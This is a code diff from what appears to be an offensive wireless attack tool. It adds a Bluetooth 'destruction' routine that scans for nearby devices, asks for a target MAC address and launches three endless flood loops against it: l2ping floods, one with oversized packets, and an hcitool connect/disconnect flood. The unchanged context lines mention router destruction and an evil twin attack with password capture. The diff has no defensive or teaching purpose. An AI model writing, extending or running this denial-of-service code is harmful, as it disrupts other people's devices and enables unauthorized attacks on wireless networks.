@@ -356,6 +356,73 @@ class AttackManager:
         print("\033[1;32m[✓] ROUTER DESTRUCTION TERMINATED\033[0m")
         print("\033[1;33m[!] Router may require physical reset to function again!\033[0m")
 
+    def bluetooth_attack(self):
+        """Nuclear Bluetooth destruction"""
+        print("\033[1;31m[📱] INITIATING BLUETOOTH DESTRUCTION...\033[0m")
+        
+        # Check Bluetooth tools
+        if not self.core.run_command("which hcitool"):
+            print("\033[1;31m[✘] BLUETOOTH TOOLS NOT AVAILABLE\033[0m")
+            return
+        
+        # Enable Bluetooth
+        self.core.run_command("systemctl start bluetooth >/dev/null 2>&1")
+        self.core.run_command("hciconfig hci0 up >/dev/null 2>&1")
+        
+        # Scan for devices
+        devices = self.scanner.bluetooth_scan()
+        
+        if not devices:
+            print("\033[1;31m[✘] NO BLUETOOTH TARGETS FOUND\033[0m")
+            return
+        
+        self.scanner.display_bluetooth_results(devices)
+        
+        target_mac = input("\n\033[1;33m[?] ENTER BLUETOOTH MAC TO ATTACK: \033[0m").strip()
+        
+        if target_mac in devices:
+            target_name = devices[target_mac]['name']
+            print(f"\033[1;31m[💣] DEPLOYING BLUETOOTH NUKES ON: {target_name}\033[0m")
+            
+            # Attack 1: L2PING Flood
+            print("\033[1;31m[⚡] WEAPON 1: L2PING FLOOD\033[0m")
+            proc1 = self.core.run_command(
+                f"xterm -geometry 80x15 -bg black -fg cyan -title 'BT-L2PING-FLOOD' -e 'while true; do l2ping -f {target_mac} 2>/dev/null; sleep 1; done' &",
+                background=True
+            )
+            if proc1:
+                self.attack_processes.append(proc1)
+                self.core.add_attack_process(proc1)
+            
+            # Attack 2: Connection Flood
+            print("\033[1;31m[⚡] WEAPON 2: CONNECTION FLOOD\033[0m")
+            proc2 = self.core.run_command(
+                f"xterm -geometry 80x15 -bg black -fg magenta -title 'BT-CONNECTION-FLOOD' -e 'while true; do hcitool cc {target_mac} 2>/dev/null && hcitool dc {target_mac} 2>/dev/null; sleep 0.3; done' &",
+                background=True
+            )
+            if proc2:
+                self.attack_processes.append(proc2)
+                self.core.add_attack_process(proc2)
+            
+            # Attack 3: Packet Flood
+            print("\033[1;31m[⚡] WEAPON 3: PACKET FLOOD\033[0m")
+            proc3 = self.core.run_command(
+                f"xterm -geometry 80x15 -bg black -fg green -title 'BT-PACKET-FLOOD' -e 'while true; do l2ping -s 600 -f {target_mac} 2>/dev/null; sleep 0.5; done' &",
+                background=True
+            )
+            if proc3:
+                self.attack_processes.append(proc3)
+                self.core.add_attack_process(proc3)
+            
+            print("\033[1;32m[✓] BLUETOOTH DESTRUCTION ACTIVE\033[0m")
+            print("\033[1;33m[!] PRESS ENTER TO STOP ATTACK...\033[0m")
+            input()
+            
+            self.stop_attacks()
+            print("\033[1;32m[✓] BLUETOOTH ATTACK TERMINATED\033[0m")
+        else:
+            print("\033[1;31m[✘] INVALID BLUETOOTH MAC\033[0m")
+
     def advanced_evil_twin(self):
         """Advanced Evil Twin with perfect replication and password capture"""
         print("\033[1;33m[!] INITIATING ADVANCED EVIL TWIN ATTACK...\033[0m")
